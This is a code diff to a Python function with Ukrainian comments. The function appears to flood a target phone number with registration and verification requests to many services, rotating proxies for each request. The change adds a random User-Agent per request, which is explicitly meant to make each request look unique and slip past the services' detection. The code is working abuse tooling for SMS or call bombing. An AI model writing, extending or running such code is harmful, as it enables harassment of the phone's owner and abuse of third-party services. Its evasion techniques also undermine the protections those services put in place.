@@ -1428,14 +1428,27 @@ async def ukr(number, chat_id):
         ("https://api.kolomarket.abmloyalty.app/v2.1/client/registration", {"json": {"phone": number, "password": "!EsRP2S-$s?DjT@", "token": "null"}}, 'POST')
     ]
     
-    # Створюємо tasks з унікальними проксі для кожного запиту
+    # Створюємо tasks з унікальними проксі та User-Agent для кожного запиту
     tasks = []
     for url, kwargs, method in services:
         proxy_url, proxy_auth = pick_proxy()  # Кожен запит отримує унікальний проксі
         req_kwargs = kwargs.copy()
+        
+        # Генеруємо унікальний User-Agent для кожного запиту
+        unique_ua = fake_useragent.UserAgent().random
+        
         # Додаємо headers якщо не вказані
         if "headers" not in req_kwargs:
-            req_kwargs["headers"] = headers
+            req_kwargs["headers"] = {"User-Agent": unique_ua}
+        else:
+            # Оновлюємо User-Agent навіть якщо headers вже є
+            if isinstance(req_kwargs["headers"], dict):
+                req_kwargs["headers"] = req_kwargs["headers"].copy()
+                req_kwargs["headers"]["User-Agent"] = unique_ua
+            else:
+                # Якщо headers - це вже об'єкт, створюємо новий словник
+                req_kwargs["headers"] = {"User-Agent": unique_ua}
+        
         # Додаємо метод, проксі та авторизацію
         req_kwargs["method"] = method
         req_kwargs["proxy"] = proxy_url
